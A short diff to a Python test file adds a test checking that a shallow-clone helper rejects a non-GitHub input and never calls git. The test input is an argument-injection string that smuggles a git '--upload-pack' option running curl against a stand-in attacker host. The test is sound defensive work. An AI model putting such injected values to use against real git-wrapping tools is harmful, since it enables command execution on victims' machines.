@@ -67,3 +67,13 @@ def test_clone_shallow_surfaces_disk_full_with_actionable_message(monkeypatch):
     with pytest.raises(TargetResolutionError, match="disk full"):
         with clone_shallow("https://github.com/org/repo"):
             pass
+
+
+def test_clone_shallow_refuses_a_non_github_url_without_calling_git(monkeypatch):
+    monkeypatch.setattr(
+        "secfoo.targets.github.subprocess.run",
+        lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("git must not run")),
+    )
+    with pytest.raises(TargetResolutionError, match="refusing to clone"):
+        with clone_shallow("--upload-pack=curl https://evil.example"):
+            pass
